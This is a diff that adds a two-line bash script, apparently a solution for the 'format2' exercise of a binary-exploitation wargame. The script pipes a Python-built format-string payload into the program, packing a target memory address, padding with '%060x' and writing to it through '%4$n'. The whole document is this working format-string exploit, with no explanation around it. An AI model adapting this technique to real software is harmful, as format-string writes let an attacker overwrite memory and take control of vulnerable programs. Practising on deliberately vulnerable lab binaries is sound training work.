@@ -1,0 +1,2 @@
+#!/bin/bash
+python -c "print '\xe4\x96\x04\x08' + '%060x' + '%4\$n'" | ./format2
